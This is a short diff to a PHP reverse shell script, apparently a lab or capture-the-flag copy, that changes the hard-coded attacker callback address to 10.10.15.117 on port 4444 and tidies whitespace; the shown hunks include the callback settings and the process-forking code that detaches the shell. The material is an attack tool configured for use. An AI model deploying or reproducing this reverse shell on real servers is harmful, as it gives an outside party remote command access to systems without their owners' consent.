@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.6.40.234';  // CHANGE THIS
+$ip = '10.10.15.117';  // CHANGE THIS
 $port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
@@ -64,12 +64,12 @@ $debug = 0;
 if (function_exists('pcntl_fork')) {
 	// Fork and have the parent process exit
 	$pid = pcntl_fork();
-	
+
 	if ($pid == -1) {
 		printit("ERROR: Can't fork");
 		exit(1);
 	}
-	
+
 	if ($pid) {
 		exit(0);  // Parent exits
 	}
@@ -186,7 +186,4 @@ function printit ($string) {
 	}
 }
 
-?> 
-
-
-
+?>
